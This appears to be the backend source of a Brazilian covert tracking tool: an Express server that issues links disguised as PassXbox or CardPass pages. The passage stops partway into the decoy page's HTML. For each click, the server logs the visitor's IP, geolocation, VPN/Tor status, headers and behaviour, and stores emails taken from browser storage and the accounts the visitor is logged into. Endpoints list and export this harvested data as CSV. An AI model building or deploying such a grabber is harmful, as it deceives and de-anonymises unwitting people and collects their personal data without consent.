const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');
const bodyParser = require('body-parser');
const geoip = require('geoip-lite');
const useragent = require('useragent');
const path = require('path');
const fs = require('fs');
const https = require('https');
const http = require('http');

const app = express();
const PORT = process.env.PORT || 3000;
const DOMAIN = process.env.DOMAIN || 'localhost:3000'; // Pode ser configurado para um domínio real

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));

// Servir arquivos estáticos ANTES das rotas
const publicPath = path.join(__dirname, 'public');
app.use(express.static(publicPath, {
  index: 'index.html',
  extensions: ['html', 'js', 'css', 'jpg', 'png', 'gif']
}));

// Inicializar banco de dados
// Na Vercel, usar caminho temporário para evitar problemas de escrita
const dbPath = process.env.VERCEL ? '/tmp/tracker.db' : './tracker.db';
const db = new sqlite3.Database(dbPath, (err) => {
  if (err) {
    console.error('Erro ao conectar ao banco de dados:', err);
  } else {
    console.log('Banco de dados conectado:', dbPath);
  }
});

// Criar tabelas
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS links (
    id TEXT PRIMARY KEY,
    original_url TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    click_count INTEGER DEFAULT 0
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS clicks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    link_id TEXT NOT NULL,
    ip_address TEXT,
    user_agent TEXT,
    referrer TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    data TEXT,
    vpn_proxy TEXT,
    risk_score INTEGER DEFAULT 0,
    emails TEXT,
    linked_accounts TEXT,
    FOREIGN KEY (link_id) REFERENCES links(id)
  )`);
  
  // Tabela para emails encontrados
  db.run(`CREATE TABLE IF NOT EXISTS emails (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT NOT NULL,
    click_id INTEGER,
    source TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (click_id) REFERENCES clicks(id)
  )`);
  
  // Tabela para contas vinculadas
  db.run(`CREATE TABLE IF NOT EXISTS linked_accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    click_id INTEGER,
    service TEXT,
    logged_in INTEGER DEFAULT 0,
    user_id TEXT,
    email TEXT,
    indicators TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (click_id) REFERENCES clicks(id)
  )`);
  
  db.run(`CREATE INDEX IF NOT EXISTS idx_email ON emails(email)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_service ON linked_accounts(service)`);

  db.run(`CREATE INDEX IF NOT EXISTS idx_link_id ON clicks(link_id)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_ip_address ON clicks(ip_address)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_timestamp ON clicks(timestamp)`);
});

// Função auxiliar para fazer requisições HTTP
function httpRequest(url) {
  return new Promise((resolve, reject) => {
    const protocol = url.startsWith('https') ? https : http;
    const req = protocol.get(url, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          reject(e);
        }
      });
    });
    req.on('error', reject);
    req.setTimeout(3000, () => {
      req.destroy();
      reject(new Error('Timeout'));
    });
  });
}

// Obter dados geográficos adicionais
async function getAdditionalGeoData(ip) {
  try {
    const data = await httpRequest(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
    if (data.status === 'success') {
      return {
        country: data.country,
        countryCode: data.countryCode,
        region: data.regionName,
        regionCode: data.region,
        city: data.city,
        zip: data.zip,
        latitude: data.lat,
        longitude: data.lon,
        timezone: data.timezone,
        isp: data.isp,
        organization: data.org,
        asn: data.as,
        source: 'ip-api.com'
      };
    }
  } catch (e) {
    // Ignorar erros
  }
  return null;
}

// Obter nome do país
function getCountryName(code) {
  const countries = {
    'BR': 'Brasil', 'US': 'Estados Unidos', 'GB': 'Reino Unido',
    'CA': 'Canadá', 'AU': 'Austrália', 'DE': 'Alemanha',
    'FR': 'França', 'IT': 'Itália', 'ES': 'Espanha',
    'PT': 'Portugal', 'MX': 'México', 'AR': 'Argentina',
    'CL': 'Chile', 'CO': 'Colômbia', 'PE': 'Peru'
  };
  return countries[code] || code;
}

// Função EXPANDIDA para detectar VPN/Proxy usando múltiplas APIs
async function detectVPNProxy(ip) {
  const results = {
    isVPN: false,
    isProxy: false,
    isTor: false,
    provider: null,
    confidence: 0,
    sources: [],
    checkedAt: new Date().toISOString(),
    details: {
      organization: null,
      asn: null,
      type: null,
      isDatacenter: false,
      isHosting: false,
      isMobile: false,
      isResidential: false
    }
  };

  // Lista de provedores VPN conhecidos (expansão)
  const knownVPNProviders = [
    'nordvpn', 'expressvpn', 'surfshark', 'cyberghost', 'private internet access',
    'pia', 'protonvpn', 'tunnelbear', 'windscribe', 'vyprvpn', 'hotspot shield',
    'ipvanish', 'purevpn', 'hide.me', 'zenmate', 'buffered', 'safervpn',
    'tor guard', 'vpn unlimited', 'strongvpn', 'hidemyass', 'hma',
    'mullvad', 'ivpn', 'perfect privacy', 'airvpn', 'ovpn', 'azirevpn'
  ];

  // Lista de palavras-chave de proxy/VPN
  const vpnKeywords = ['vpn', 'proxy', 'anonymizer', 'anonymizing', 'privacy', 'secure tunnel'];

  // API 1: ipapi.co (gratuita, limitada)
  try {
    const ipapiData = await httpRequest(`https://ipapi.co/${ip}/json/`);
    if (ipapiData.org) {
      const orgLower = ipapiData.org.toLowerCase();
      if (orgLower.includes('vpn') || orgLower.includes('proxy') || 
          orgLower.includes('hosting') || orgLower.includes('datacenter')) {
        results.isVPN = orgLower.includes('vpn');
        results.isProxy = orgLower.includes('proxy');
        results.provider = ipapiData.org;
        results.confidence += 30;
        results.sources.push('ipapi.co');
        results.details.organization = ipapiData.org;
        results.details.isHosting = orgLower.includes('hosting') || orgLower.includes('datacenter');
      }
      if (ipapiData.org_type) {
        results.details.type = ipapiData.org_type;
        if (ipapiData.org_type === 'hosting') results.details.isDatacenter = true;
        if (ipapiData.org_type === 'mobile') results.details.isMobile = true;
        if (ipapiData.org_type === 'isp') results.details.isResidential = true;
      }
    }
    if (ipapiData.asn) results.details.asn = ipapiData.asn;
  } catch (e) {
    // Ignorar erros de API
  }

  // API 2: ip-api.com (gratuita) - Mais completa e confiável
  try {
    // Campos: status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,proxy,hosting,mobile
    const ipApiData = await httpRequest(`http://ip-api.com/json/${ip}?fields=66846719`);
    
    // Verificar campos diretos de proxy/hosting
    if (ipApiData.proxy === true) {
      results.isProxy = true;
      results.confidence += 50;
      results.sources.push('ip-api.com (proxy=true)');
    }
    if (ipApiData.hosting === true) {
      results.isVPN = true;
      results.details.isHosting = true;
      results.confidence += 50;
      results.sources.push('ip-api.com (hosting=true)');
    }
    
    // Verificar organização
    if (ipApiData.org) {
      const orgLower = ipApiData.org.toLowerCase();
      results.details.organization = ipApiData.org;
      
      // Verificar Tor
      if (orgLower.includes('tor') || orgLower.includes('onion') || orgLower.includes('exit')) {
        results.isTor = true;
        results.confidence += 60;
        results.provider = ipApiData.org;
      }
      
      // Verificar VPN/Proxy na organização
      const hasVPNKeyword = vpnKeywords.some(keyword => orgLower.includes(keyword));
      const hasKnownVPN = knownVPNProviders.some(provider => orgLower.includes(provider));
      
      if (hasVPNKeyword || hasKnownVPN) {
        results.isVPN = true;
        results.provider = ipApiData.org;
        results.confidence += 40;
        results.sources.push('ip-api.com (org analysis)');
      }
      
      // Verificar proxy na organização
      if (orgLower.includes('proxy') && !results.isVPN) {
        results.isProxy = true;
        results.provider = ipApiData.org;
        results.confidence += 30;
      }
    }
    
    // Verificar ISP
    if (ipApiData.isp) {
      const ispLower = ipApiData.isp.toLowerCase();
      const hasVPNKeyword = vpnKeywords.some(keyword => ispLower.includes(keyword));
      const hasKnownVPN = knownVPNProviders.some(provider => ispLower.includes(provider));
      
      if (hasVPNKeyword || hasKnownVPN) {
        results.isVPN = true;
        if (!results.provider) results.provider = ipApiData.isp;
        results.confidence += 35;
        results.sources.push('ip-api.com (isp analysis)');
      }
    }
    
    if (ipApiData.as) results.details.asn = ipApiData.as;
    if (ipApiData.mobile) results.details.isMobile = true;
  } catch (e) {
    console.error('Erro na API ip-api.com:', e.message);
  }

  // API 3: ipinfo.io (gratuita, limitada)
  try {
    const ipinfoData = await httpRequest(`https://ipinfo.io/${ip}/json`);
    if (ipinfoData.org) {
      const orgLower = ipinfoData.org.toLowerCase();
      if (orgLower.includes('vpn') || orgLower.includes('proxy') || 
          orgLower.includes('hosting') || orgLower.includes('datacenter')) {
        if (!results.provider) results.provider = ipinfoData.org;
        results.confidence += 20;
        results.sources.push('ipinfo.io');
        if (!results.details.organization) results.details.organization = ipinfoData.org;
      }
    }
    if (ipinfoData.org && ipinfoData.org.includes('AS')) {
      results.details.asn = ipinfoData.org;
    }
  } catch (e) {
    // Ignorar erros de API
  }

  // Verificar padrões conhecidos via geoip
  const geo = geoip.lookup(ip);
  if (geo) {
    // Verificar organização conhecida
    if (geo.org) {
      const orgLower = geo.org.toLowerCase();
      
      // Verificar VPN/Proxy na organização geoip
      const hasVPNKeyword = vpnKeywords.some(keyword => orgLower.includes(keyword));
      const hasKnownVPN = knownVPNProviders.some(provider => orgLower.includes(provider));
      
      if (hasVPNKeyword || hasKnownVPN) {
        results.isVPN = true;
        if (!results.provider) results.provider = geo.org;
        results.confidence += 25;
        results.sources.push('geoip-lite (org analysis)');
      }
      
      // Verificar datacenters conhecidos (pode indicar VPN)
      if (orgLower.includes('amazon') || orgLower.includes('google') || 
          orgLower.includes('microsoft') || orgLower.includes('digitalocean') ||
          orgLower.includes('linode') || orgLower.includes('vultr') ||
          orgLower.includes('ovh') || orgLower.includes('hetzner') ||
          orgLower.includes('aws') || orgLower.includes('azure')) {
        results.details.isDatacenter = true;
        results.details.isHosting = true;
        // Datacenter pode indicar VPN, mas não é certeza
        if (results.confidence < 30) {
          results.confidence += 10;
        }
      }
    }
  }
  
  // API 4: ipapi.co com verificação adicional
  try {
    const ipapiData2 = await httpRequest(`https://ipapi.co/${ip}/json/`);
    if (ipapiData2.org) {
      const orgLower = ipapiData2.org.toLowerCase();
      const hasVPNKeyword = vpnKeywords.some(keyword => orgLower.includes(keyword));
      const hasKnownVPN = knownVPNProviders.some(provider => orgLower.includes(provider));
      
      if (hasVPNKeyword || hasKnownVPN) {
        results.isVPN = true;
        if (!results.provider) results.provider = ipapiData2.org;
        results.confidence += 20;
        if (!results.sources.includes('ipapi.co')) {
          results.sources.push('ipapi.co (org analysis)');
        }
      }
    }
  } catch (e) {
    // Ignorar erros
  }
  
  // Normalizar confiança (máximo 100)
  results.confidence = Math.min(results.confidence, 100);
  
  // Se confiança for alta, garantir que está marcado
  if (results.confidence >= 50 && !results.isVPN && !results.isProxy && !results.isTor) {
    // Se tem alta confiança mas não detectou, pode ser VPN/Proxy não identificado
    results.isVPN = true; // Assumir VPN se confiança alta
    results.provider = results.details.organization || 'Unknown VPN/Proxy';
  }

  // Análise de padrões no IP
  // IPs de datacenters conhecidos geralmente têm padrões específicos
  const ipParts = ip.split('.');
  if (ipParts.length === 4) {
    const firstOctet = parseInt(ipParts[0]);
    // Ranges comuns de datacenters
    if (firstOctet === 10 || (firstOctet >= 172 && firstOctet <= 172) || 
        (firstOctet >= 192 && firstOctet <= 192)) {
      // IP privado - não é público, mas pode indicar proxy
    }
  }

  return results;
}

// Função EXPANDIDA para calcular score de risco (MÁXIMO)
function calculateRiskScore(data, vpnProxy) {
  let score = 0;
  const factors = [];

  // VPN/Proxy aumenta risco significativamente
  if (vpnProxy.isVPN) {
    score += 30;
    factors.push('VPN detectada');
  }
  if (vpnProxy.isProxy) {
    score += 30;
    factors.push('Proxy detectado');
  }
  if (vpnProxy.isTor) {
    score += 50;
    factors.push('Tor detectado - RISCO MÁXIMO');
  }
  if (vpnProxy.details && vpnProxy.details.isDatacenter) {
    score += 15;
    factors.push('IP de datacenter');
  }

  // Comportamento suspeito (EXPANDIDO)
  if (data.behavior && data.behavior.suspiciousBehavior) {
    if (data.behavior.suspiciousBehavior.suspicious) {
      score += 20;
      score += data.behavior.suspiciousBehavior.reasons.length * 5;
      factors.push(`Comportamento suspeito: ${data.behavior.suspiciousBehavior.botProbability}% bot`);
    }
    if (data.behavior.suspiciousBehavior.botProbability) {
      score += Math.min(data.behavior.suspiciousBehavior.botProbability, 30);
    }
  }

  // Automação detectada
  if (data.browser && data.browser.automation) {
    if (data.browser.automation.webdriver) {
      score += 40;
      factors.push('WebDriver detectado (Selenium/Puppeteer)');
    }
    if (data.browser.automation.bot) {
      score += 30;
      factors.push('Bot detectado');
    }
    if (data.browser.automation.plugins === false && data.browser.automation.languages === false) {
      score += 25;
      factors.push('Características de bot (sem plugins/languages)');
    }
  }

  // Modo privado pode indicar tentativa de ocultação
  if (data.browser && data.browser.privateMode === true) {
    score += 10;
    factors.push('Modo privado/incógnito');
  }

  // Pouco tempo na página pode indicar bot
  if (data.behavior && data.behavior.timeOnPage) {
    if (data.behavior.timeOnPage < 1000) {
      score += 15;
      factors.push('Tempo muito curto na página');
    }
    if (data.behavior.timeOnPage < 500) {
      score += 10;
      factors.push('Saiu imediatamente (bot)');
    }
  }

  // Sem interação humana
  if (data.behavior) {
    const totalInteractions = 
      (data.behavior.mouseMovements?.length || 0) +
      (data.behavior.clicks?.length || 0) +
      (data.behavior.scrolls?.length || 0) +
      (data.behavior.keystrokes?.length || 0);
    
    if (totalInteractions === 0 && data.behavior.timeOnPage > 2000) {
      score += 20;
      factors.push('Nenhuma interação humana detectada');
    }
  }

  // Extensões de privacidade
  if (data.browser && data.browser.extensions) {
    if (data.browser.extensions.adblock || data.browser.extensions.privacy) {
      score += 5;
      factors.push('Extensões de privacidade detectadas');
    }
  }

  // Score máximo 100
  score = Math.min(score, 100);

  return {
    score: score,
    level: score >= 70 ? 'HIGH' : score >= 40 ? 'MEDIUM' : 'LOW',
    factors: factors
  };
}

// API: Criar novo link de rastreamento
app.post('/api/create-link', (req, res) => {
  const { url, usePassXbox, useCardPass, customDomain } = req.body;
  
  if (!url) {
    return res.status(400).json({ error: 'URL é obrigatória' });
  }

  const linkId = uuidv4().substring(0, 8);
  
  // Determinar tipo de página camuflada
  // SEMPRE usar página camuflada por padrão se não especificado
  const pageType = useCardPass ? 'cardpass' : (usePassXbox ? 'passxbox' : 'passxbox');
  
  // Criar link camuflado
  let trackingUrl;
  const host = req.get('host');
  
  // Se tiver domínio customizado, usar ele
  if (customDomain && customDomain.trim()) {
    // Remover http:// ou https:// se tiver, e remover barras no final
    let cleanDomain = customDomain.trim();
    cleanDomain = cleanDomain.replace(/^https?:\/\//, ''); // Remove http:// ou https://
    cleanDomain = cleanDomain.replace(/\/$/, ''); // Remove barra no final
    cleanDomain = cleanDomain.split('/')[0]; // Pega apenas o domínio (remove paths)
    
    // Se o domínio contém localhost ou 127.0.0.1, usar o host da Vercel
    if (host && !host.includes('localhost') && !host.includes('127.0.0.1')) {
      // Em produção na Vercel, usar o domínio da Vercel mesmo se customDomain for passxbox.com.br
      // Porque passxbox.com.br não está configurado no DNS
      trackingUrl = `https://${host}/${pageType}/${linkId}`;
    } else {
      // Desenvolvimento local - usar domínio customizado mesmo que não exista
      trackingUrl = `https://${cleanDomain}/${linkId}`;
    }
  } else if (host.includes('localhost') || host.includes('127.0.0.1')) {
    // Desenvolvimento local - usar domínio camuflado padrão
    const defaultDomain = process.env.DEFAULT_DOMAIN || 'passxbox.com';
    trackingUrl = `https://${defaultDomain}/${linkId}`;
  } else {
    // Produção sem domínio customizado - usar host atual da Vercel
    trackingUrl = `https://${host}/${pageType}/${linkId}`;
  }

  db.run(
    'INSERT INTO links (id, original_url) VALUES (?, ?)',
    [linkId, url],
    function(err) {
      if (err) {
        console.error('Erro ao inserir link no banco:', err);
        return res.status(500).json({ error: 'Erro ao criar link: ' + err.message });
      }
      
      console.log('Link criado com sucesso:', { linkId, trackingUrl, originalUrl: url });
      
      res.json({ 
        linkId, 
        trackingUrl,
        originalUrl: url,
        isPassXbox: usePassXbox || false,
        isCardPass: useCardPass || false
      });
    }
  );
});

// API: Coletar dados do clique (aceita sendBeacon e fetch normal)
app.post('/api/track/:linkId', async (req, res) => {
  const { linkId } = req.params;
  
  // Aceitar dados de sendBeacon (FormData) ou JSON normal
  let data;
  if (req.is('application/json')) {
    data = req.body;
  } else if (req.is('multipart/form-data')) {
    // sendBeacon com FormData
    data = req.body.data ? (typeof req.body.data === 'string' ? JSON.parse(req.body.data) : req.body.data) : req.body;
  } else {
    // Tentar parsear como JSON de qualquer forma
    try {
      if (typeof req.body === 'string') {
        data = JSON.parse(req.body);
      } else if (req.body && typeof req.body === 'object') {
        data = req.body.data ? (typeof req.body.data === 'string' ? JSON.parse(req.body.data) : req.body.data) : req.body;
      } else {
        data = req.body;
      }
    } catch (e) {
      data = req.body;
    }
  }
  
  // Validar que temos dados
  if (!data || typeof data !== 'object') {
    return res.status(400).json({ error: 'Dados inválidos' });
  }

  // Obter IP do cliente (melhorado)
  let ip = req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] ||
           req.ip ||
           req.connection.remoteAddress || 
           req.socket.remoteAddress ||
           (req.connection.socket ? req.connection.socket.remoteAddress : null);

  // Limpar IP (remover porta se houver e tratar IPv6)
  if (ip) {
    // Se tiver vírgula, pegar primeiro IP (x-forwarded-for pode ter múltiplos)
    if (ip.includes(',')) {
      ip = ip.split(',')[0].trim();
    }
    // Remover porta se houver (formato: IP:PORT)
    if (ip.includes(':')) {
      // Para IPv6, pode ter múltiplos :, então pegar último elemento
      const parts = ip.split(':');
      // Se último elemento é número (porta), remover
      if (parts.length > 1 && /^\d+$/.test(parts[parts.length - 1])) {
        ip = parts.slice(0, -1).join(':');
      }
      // Se for IPv4 com porta (formato: a.b.c.d:port)
      if (ip.match(/^\d+\.\d+\.\d+\.\d+$/)) {
        // Já está limpo
      } else if (ip.startsWith('::ffff:')) {
        // IPv6 mapeado para IPv4
        ip = ip.replace('::ffff:', '');
      }
    }
    // Remover espaços
    ip = ip.trim();
  }

  // Se IP for localhost, tentar usar IP público via API
  if (!ip || ip === '::1' || ip === '127.0.0.1' || ip === 'localhost') {
    // Tentar obter IP público via API externa
    try {
      const publicIPData = await httpRequest('https://api.ipify.org?format=json');
      if (publicIPData && publicIPData.ip) {
        ip = publicIPData.ip;
      }
    } catch (e) {
      console.log('Não foi possível obter IP público:', e.message);
    }
  }

  // Processar dados de geolocalização (EXPANDIDO)
  let geoLocation = null;
  
  // Tentar primeiro com geoip-lite (mais rápido)
  if (ip && ip !== '::1' && ip !== '127.0.0.1' && ip !== 'localhost') {
    const geo = geoip.lookup(ip);
    if (geo && geo.ll) {
      geoLocation = {
        country: geo.country,
        countryName: getCountryName(geo.country),
        region: geo.region,
        city: geo.city,
        latitude: geo.ll[0],
        longitude: geo.ll[1],
        timezone: geo.timezone,
        metro: geo.metro || null,
        range: geo.range || null,
        coordinates: {
          lat: geo.ll[0],
          lng: geo.ll[1],
          accuracy: 'city_level'
        }
      };
    }
  }

  // Sempre tentar API externa para dados mais completos (ISP, organização, etc)
  if (ip && ip !== '::1' && ip !== '127.0.0.1' && ip !== 'localhost') {
    try {
      const additionalGeo = await getAdditionalGeoData(ip);
      if (additionalGeo) {
        if (geoLocation) {
          // Mesclar dados
          geoLocation.additional = additionalGeo;
          geoLocation.isp = additionalGeo.isp || geoLocation.isp;
          geoLocation.organization = additionalGeo.organization || geoLocation.organization;
          geoLocation.asn = additionalGeo.asn || geoLocation.asn;
        } else {
          // Usar apenas dados da API externa
          geoLocation = {
            country: additionalGeo.country,
            countryName: getCountryName(additionalGeo.countryCode),
            region: additionalGeo.region,
            city: additionalGeo.city,
            latitude: additionalGeo.latitude,
            longitude: additionalGeo.longitude,
            timezone: additionalGeo.timezone,
            isp: additionalGeo.isp,
            organization: additionalGeo.organization,
            asn: additionalGeo.asn,
            coordinates: {
              lat: additionalGeo.latitude,
              lng: additionalGeo.longitude,
              accuracy: 'city_level'
            },
            source: 'ip-api.com'
          };
        }
      }
    } catch (e) {
      console.error('Erro ao obter geolocalização adicional:', e);
    }
  }

  // Se ainda não tem geolocalização, criar objeto vazio
  if (!geoLocation) {
    geoLocation = {
      note: 'Localização não disponível (IP localhost ou erro na API)',
      ip: ip || 'N/A'
    };
  }

  data.geoLocation = geoLocation;

  // Processar User-Agent
  const agent = useragent.parse(req.headers['user-agent'] || '');
  data.parsedUserAgent = {
    browser: agent.family,
    browserVersion: agent.toVersion(),
    os: agent.os.family,
    osVersion: agent.os.toVersion(),
    device: agent.device.family
  };

  // Detectar VPN/Proxy (SEMPRE tentar, mesmo para localhost)
  let vpnProxy = { isVPN: false, isProxy: false, isTor: false, provider: null, confidence: 0, sources: [], details: {} };
  
  // Se for localhost, tentar obter IP público primeiro
  let checkIP = ip;
  if (!ip || ip === '::1' || ip === '127.0.0.1' || ip === 'localhost') {
    try {
      const publicIPData = await httpRequest('https://api.ipify.org?format=json');
      if (publicIPData && publicIPData.ip) {
        checkIP = publicIPData.ip;
        console.log('IP público obtido para verificação VPN/Proxy:', checkIP);
      }
    } catch (e) {
      console.log('Não foi possível obter IP público para verificação VPN/Proxy');
    }
  }
  
  // Sempre tentar detectar VPN/Proxy
  if (checkIP && checkIP !== '::1' && checkIP !== '127.0.0.1' && checkIP !== 'localhost') {
    try {
      vpnProxy = await detectVPNProxy(checkIP);
      data.network = data.network || {};
      data.network.vpnProxy = vpnProxy;
      console.log('VPN/Proxy detectado:', JSON.stringify(vpnProxy, null, 2));
    } catch (e) {
      console.error('Erro ao detectar VPN/Proxy:', e);
      // Mesmo com erro, manter estrutura básica
      data.network = data.network || {};
      data.network.vpnProxy = vpnProxy;
    }
  } else {
    // Mesmo sem IP válido, manter estrutura
    data.network = data.network || {};
    data.network.vpnProxy = vpnProxy;
  }

  // Calcular score de risco (EXPANDIDO)
  const riskAnalysis = calculateRiskScore(data, vpnProxy);
  data.riskScore = riskAnalysis.score;
  data.riskLevel = riskAnalysis.level;
  data.riskFactors = riskAnalysis.factors;

  // Adicionar IP e timestamp (garantir que IP está definido)
  data.ipAddress = ip || 'N/A';
  data.serverTimestamp = new Date().toISOString();
  
  // Log para debug
  console.log('=== COLETA DE DADOS ===');
  console.log('IP coletado:', ip);
  console.log('Geolocalização:', JSON.stringify(geoLocation, null, 2));
  console.log('=======================');

  // Adicionar headers HTTP adicionais
  data.httpHeaders = {
    accept: req.headers['accept'],
    acceptEncoding: req.headers['accept-encoding'],
    acceptLanguage: req.headers['accept-language'],
    connection: req.headers['connection'],
    host: req.headers['host'],
    origin: req.headers['origin'],
    secFetchDest: req.headers['sec-fetch-dest'],
    secFetchMode: req.headers['sec-fetch-mode'],
    secFetchSite: req.headers['sec-fetch-site'],
    secFetchUser: req.headers['sec-fetch-user'],
    upgradeInsecureRequests: req.headers['upgrade-insecure-requests'],
    xForwardedFor: req.headers['x-forwarded-for'],
    xRealIp: req.headers['x-real-ip']
  };

  // Preparar string de VPN/Proxy para banco
  const vpnProxyStr = JSON.stringify(vpnProxy);
  
  // Extrair emails e contas vinculadas
  const emails = data.accounts?.emails || [];
  const linkedAccounts = data.accounts?.linkedAccounts || {};
  const emailsStr = JSON.stringify(emails);
  const linkedAccountsStr = JSON.stringify(linkedAccounts);

  // Salvar no banco
  db.run(
    'INSERT INTO clicks (link_id, ip_address, user_agent, referrer, data, vpn_proxy, risk_score, emails, linked_accounts) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
    [linkId, ip || 'N/A', req.headers['user-agent'] || '', req.headers['referer'] || '', JSON.stringify(data), vpnProxyStr, riskScore, emailsStr, linkedAccountsStr],
    function(err) {
      if (err) {
        console.error('Erro ao salvar clique:', err);
        return res.status(500).json({ error: 'Erro ao salvar dados' });
      }

      const clickId = this.lastID;

      // Salvar emails encontrados
      if (emails.length > 0) {
        emails.forEach(email => {
          db.run('INSERT INTO emails (email, click_id, source) VALUES (?, ?, ?)', 
            [email, clickId, 'browser_storage']);
        });
      }

      // Salvar contas vinculadas
      Object.keys(linkedAccounts).forEach(service => {
        const account = linkedAccounts[service];
        if (account.loggedIn) {
          db.run('INSERT INTO linked_accounts (click_id, service, logged_in, user_id, email, indicators) VALUES (?, ?, ?, ?, ?, ?)',
            [clickId, service, 1, account.userId || account.username || null, account.email || null, JSON.stringify(account.indicators || [])]);
        }
      });

      // Atualizar contador de cliques
      db.run('UPDATE links SET click_count = click_count + 1 WHERE id = ?', [linkId]);

      // Buscar URL original para redirecionamento
      db.get('SELECT original_url FROM links WHERE id = ?', [linkId], (err, row) => {
        if (err || !row) {
          return res.status(404).json({ error: 'Link não encontrado' });
        }
        res.json({ 
          redirectUrl: row.original_url,
          riskScore: riskScore,
          riskLevel: data.riskLevel,
          emailsFound: emails.length,
          accountsFound: Object.keys(linkedAccounts).filter(s => linkedAccounts[s].loggedIn).length
        });
      });
    }
  );
});

// API: Obter dados de um link
app.get('/api/link/:linkId', (req, res) => {
  const { linkId } = req.params;

  db.get('SELECT * FROM links WHERE id = ?', [linkId], (err, link) => {
    if (err || !link) {
      return res.status(404).json({ error: 'Link não encontrado' });
    }

    db.all('SELECT * FROM clicks WHERE link_id = ? ORDER BY timestamp DESC', [linkId], (err, clicks) => {
      if (err) {
        return res.status(500).json({ error: 'Erro ao buscar cliques' });
      }

      const clicksWithData = clicks.map(click => ({
        ...click,
        data: JSON.parse(click.data || '{}')
      }));

      res.json({
        link,
        clicks: clicksWithData
      });
    });
  });
});

// API: Listar todos os links
app.get('/api/links', (req, res) => {
  db.all('SELECT * FROM links ORDER BY created_at DESC', (err, links) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao buscar links' });
    }
    res.json(links);
  });
});

// API: Estatísticas gerais
app.get('/api/stats', (req, res) => {
  db.get('SELECT COUNT(*) as totalLinks FROM links', (err, linkCount) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao buscar estatísticas' });
    }

    db.get('SELECT COUNT(*) as totalClicks FROM clicks', (err, clickCount) => {
      if (err) {
        return res.status(500).json({ error: 'Erro ao buscar estatísticas' });
      }

      db.all('SELECT COUNT(DISTINCT ip_address) as uniqueIPs FROM clicks', (err, uniqueIPs) => {
        if (err) {
          return res.status(500).json({ error: 'Erro ao buscar estatísticas' });
        }

        db.all(`SELECT COUNT(*) as highRisk FROM clicks WHERE risk_score >= 70`, (err, highRisk) => {
          if (err) {
            return res.status(500).json({ error: 'Erro ao buscar estatísticas' });
          }

          res.json({
            totalLinks: linkCount.totalLinks,
            totalClicks: clickCount.totalClicks,
            uniqueIPs: uniqueIPs[0].uniqueIPs,
            highRiskClicks: highRisk[0].highRisk
          });
        });
      });
    });
  });
});

// API: Buscar cliques por IP
app.get('/api/clicks-by-ip/:ip', (req, res) => {
  const { ip } = req.params;
  db.all('SELECT * FROM clicks WHERE ip_address = ? ORDER BY timestamp DESC', [ip], (err, clicks) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao buscar cliques' });
    }

    const clicksWithData = clicks.map(click => ({
      ...click,
      data: JSON.parse(click.data || '{}'),
      vpnProxy: JSON.parse(click.vpn_proxy || '{}')
    }));

    res.json(clicksWithData);
  });
});

// API: Exportar dados (CSV)
app.get('/api/export/:linkId', (req, res) => {
  const { linkId } = req.params;

  db.all('SELECT * FROM clicks WHERE link_id = ? ORDER BY timestamp DESC', [linkId], (err, clicks) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao exportar dados' });
    }

    // Criar CSV
    let csv = 'ID,Link ID,IP Address,User Agent,Referrer,Timestamp,Risk Score,VPN/Proxy,Emails,Linked Accounts\n';
    
    clicks.forEach(click => {
      const vpnProxy = JSON.parse(click.vpn_proxy || '{}');
      const vpnProxyStr = vpnProxy.isVPN ? 'VPN' : vpnProxy.isProxy ? 'Proxy' : vpnProxy.isTor ? 'Tor' : 'No';
      const emails = JSON.parse(click.emails || '[]');
      const accounts = JSON.parse(click.linked_accounts || '{}');
      const accountsList = Object.keys(accounts).filter(s => accounts[s].loggedIn).join(';');
      
      csv += `${click.id},${click.link_id},"${click.ip_address}","${click.user_agent}","${click.referrer}",${click.timestamp},${click.risk_score},${vpnProxyStr},"${emails.join(';')}","${accountsList}"\n`;
    });

    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename="tracking_data_${linkId}.csv"`);
    res.send(csv);
  });
});

// API: Buscar emails encontrados
app.get('/api/emails', (req, res) => {
  db.all('SELECT DISTINCT email, COUNT(*) as count, MAX(timestamp) as last_seen FROM emails GROUP BY email ORDER BY last_seen DESC', (err, emails) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao buscar emails' });
    }
    res.json(emails);
  });
});

// API: Buscar contas vinculadas por serviço
app.get('/api/accounts/:service', (req, res) => {
  const { service } = req.params;
  db.all('SELECT * FROM linked_accounts WHERE service = ? ORDER BY timestamp DESC', [service], (err, accounts) => {
    if (err) {
      return res.status(500).json({ error: 'Erro ao buscar contas' });
    }
    res.json(accounts);
  });
});

// Rota especial para passxbox.com (página camuflada)
app.get('/passxbox/:linkId', (req, res) => {
  const { linkId } = req.params;
  
  // Verificar se o link existe
  db.get('SELECT original_url FROM links WHERE id = ?', [linkId], (err, row) => {
    if (err || !row) {
      return res.status(404).send('Link não encontrado');
    }

    // Servir página camuflada do PassXbox
    const html = `
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
